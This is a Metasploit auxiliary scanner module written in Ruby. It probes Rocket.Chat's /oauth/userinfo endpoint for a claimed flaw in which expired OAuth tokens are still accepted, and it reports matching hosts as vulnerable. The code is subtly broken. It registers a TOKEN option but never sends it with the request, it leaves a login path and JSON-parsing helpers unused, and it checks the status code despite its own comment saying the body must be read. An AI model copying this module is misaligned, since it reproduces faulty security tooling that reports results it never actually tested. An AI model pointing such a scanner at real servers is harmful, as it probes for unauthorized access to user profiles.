class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat /oauth/userinfo expired-token scanner (VULN-018)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. /oauth/userinfo accepts an
          expired access token for up to 30 days, because only the REST bearer path
          checks expiry. This scanner presents TOKEN to /oauth/userinfo; a host is
          vulnerable when an expired token still returns the profile. It only reads,
          and needs an expired token the operator captures.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/oauth/userinfo']),
      OptString.new('TOKEN', [true, 'An expired OAuth access token', 'expired'])
    ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    unless res
      vprint_error("#{peer} - No response")
      return
    end

    hit = res.code == 200 && res.body.to_s.include?('"sub"')
    unless hit
      vprint_status("#{peer} - Not vulnerable to VULN-018")
      return
    end

    print_good("#{peer} - Vulnerable: VULN-018")
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-018 confirmed by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end
end
